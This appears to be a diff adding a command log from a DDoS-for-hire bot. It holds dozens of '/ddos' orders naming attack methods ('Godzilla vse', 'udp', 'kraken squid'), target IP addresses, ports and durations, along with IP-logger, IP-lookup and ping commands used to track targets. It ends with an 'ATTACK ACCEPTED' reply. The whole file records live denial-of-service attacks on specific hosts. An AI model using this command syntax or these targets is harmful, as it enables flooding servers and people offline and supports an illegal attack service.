@@ -1,0 +1,90 @@
+/ddos Godzilla vse 128.116.25.34 49525 120
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.22.93 120 49805
+/ddos Godzilla udp 128.116.22.93 120 49805
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.25.34 1200 49525
+/ddos Godzilla vse 128.116.25.34 120 49525
+/iplogger
+/ddos Godzilla vse 128.116.25.34 120 49525
+/ddos Godzilla vse 128.116.64.97 120 60408
+/ddos Godzilla vse 128.116.64.97 120 60408
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.74.50 120 54814
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.42.15 120 54238
+/ddos Godzilla vse 128.116.42.15 120 54238
+/xboxcode
+/xboxcode
+/accounts
+/vpn
+/help
+/
+/iplookup 54.38.81.231
+/ddos kraken squid 54.38.81.231 200
+/ddos Godzilla vse 128.116.63.75 120 63752
+/ddos Godzilla vse 128.116.63.75 120 63752
+/ddos Godzilla vse 128.116.75.50 120 64015
+/ddos godzilla 128.116.59.25 120 56684
+/ddos godzilla vse 128.116.59.25 120 56684
+/ddos Godzilla vse 128.116.59.25 120 56684
+/ddos Godzilla vse 128.116.59.25 120 56684
+/ddos Godzilla vse 128.116.59.25 120 56684
+/ddos Godzilla vse 128.116.40.12 120 50371
+/ddos Godzilla vse 128.116.72.55 120 55573
+/ddos Godzilla vse 128.116.72.55 120 55573
+/ddos Godzilla vse 128.116.72.55 120 55573
+/ddos Godzilla vse 128.116.19.210 120 57330
+/ddos Godzilla vse 128.116.19.210 120 57330
+/ddos Godzilla vse 128.116.19.210 120 57330
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.24 120 56488
+/ddos Godzilla vse 128.116.75.246 120 62378
+/checkservers
+/ddos Godzilla vse 128.116.75.246 120 62378
+/ddos Godzilla vse 128.116.75.246 120 62378
+/ddos Godzilla vse 128.116.75.246 120 62378
+/ddos Godzilla vse 128.116.75.246 120 62378
+/ddos Godzilla vse 128.116.75.246 120 62378
+/ddos Godzilla vse 128.116.75.246 120 62378
+[Wed Jul 29 2020 11:25:59 GMT-1100 (Samoa Standard Time)] /plan
+[Wed Jul 29 2020 12:00:21 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 128.116.32.149 120 53150
+[Wed Jul 29 2020 13:06:19 GMT-1100 (Samoa Standard Time)] /iplogger
+[Wed Jul 29 2020 13:18:44 GMT-1100 (Samoa Standard Time)] /ddos kraken squiad 84.3.189.205 1200 80
+[Wed Jul 29 2020 13:19:24 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 84.3.189.205 1200 80
+[Wed Jul 29 2020 13:23:07 GMT-1100 (Samoa Standard Time)] /pingip 84.3.189.205
+[Wed Jul 29 2020 13:23:36 GMT-1100 (Samoa Standard Time)] /ping 84.3.189.205
+[Wed Jul 29 2020 13:28:10 GMT-1100 (Samoa Standard Time)] /ipcheck 84.3.189.205
+[Wed Jul 29 2020 13:28:16 GMT-1100 (Samoa Standard Time)] /checkip 84.3.189.205
+[Wed Jul 29 2020 13:44:10 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 84.3.189.205 1200 80
+[Wed Jul 29 2020 13:48:28 GMT-1100 (Samoa Standard Time)] /ping 84.3.189.205
+[Wed Jul 29 2020 13:51:38 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 84.3.189.205 1200 80
+[Wed Jul 29 2020 14:06:45 GMT-1100 (Samoa Standard Time)] /ping 84.3.189.205
+[Wed Jul 29 2020 14:23:14 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 82.5.29.95 1200
+[Wed Jul 29 2020 14:39:12 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 84.3.189.205 51 1200
+[Wed Jul 29 2020 14:40:06 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 84.3.189.205 1200 51
+[Wed Jul 29 2020 14:41:15 GMT-1100 (Samoa Standard Time)] /checkservers
+[Sun Aug 02 2020 09:27:00 GMT-1100 (Samoa Standard Time)] /checkip 193.9.63.11
+[Mon Aug 03 2020 15:51:37 GMT-1100 (Samoa Standard Time)] /methods
+[Mon Aug 03 2020 15:52:08 GMT-1100 (Samoa Standard Time)] /ddos godzilla udp 128.116.41.135 120 49261
+[Mon Aug 03 2020 15:55:24 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 128.116.41.135 120 49261
+[Mon Aug 03 2020 15:57:46 GMT-1100 (Samoa Standard Time)] /ddos Godzilla vse 128.116.41.135 49261 120
+[Tue Aug 04 2020 22:31:14 GMT-1100 (Samoa Standard Time)] /plan
+[Sun Aug 09 2020 02:45:10 GMT-1100 (Samoa Standard Time)] /iplogger
+[Tue Aug 11 2020 04:01:45 GMT-1100 (Samoa Standard Time)] /iplogger
+[Tue Aug 11 2020 04:01:46 GMT-1100 (Samoa Standard Time)] /plan
+[Fri Aug 21 2020 02:04:49 GMT-1100 (Samoa Standard Time)] /plan
+[Fri Aug 21 2020 02:15:47 GMT-1100 (Samoa Standard Time)] /iplogger
+[Fri Aug 21 2020 02:24:23 GMT-1100 (Samoa Standard Time)] /ddos kraken squid 180.93.223.87 1200
+[Fri Aug 21 2020 02:24:23 GMT-1100 (Samoa Standard Time)] ATTACK ACCEPTED
